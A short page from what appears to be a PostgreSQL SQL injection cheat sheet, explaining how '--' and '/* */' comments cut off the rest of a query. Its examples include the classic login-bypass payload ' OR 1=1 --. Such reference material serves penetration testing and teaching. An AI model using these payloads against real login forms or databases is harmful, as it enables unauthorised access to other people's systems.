---
title: Comment Out Query
description: Techniques for commenting out the remainder of SQL queries in PostgreSQL
category: Basics
order: 3
tags: ["comments", "basics", "query manipulation"]
lastUpdated: 2025-12-07
---

The following methods can be used to comment out the rest of a query after your injection:

| Comment Syntax | Description           |
| -------------- | --------------------- |
| `--`           | SQL line comment      |
| `/* */`        | C-style block comment |

## Examples

```sql
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
```

```sql
SELECT * FROM Users WHERE username = '' OR 1=1 /*' AND password = ''*/;
```

## Notes

- PostgreSQL uses standard SQL comment syntax
- The `--` comment extends to the end of the line
- Block comments `/* */` can be nested in PostgreSQL (unlike some other databases)
- The `#` hash comment (used in MySQL) does NOT work in PostgreSQL
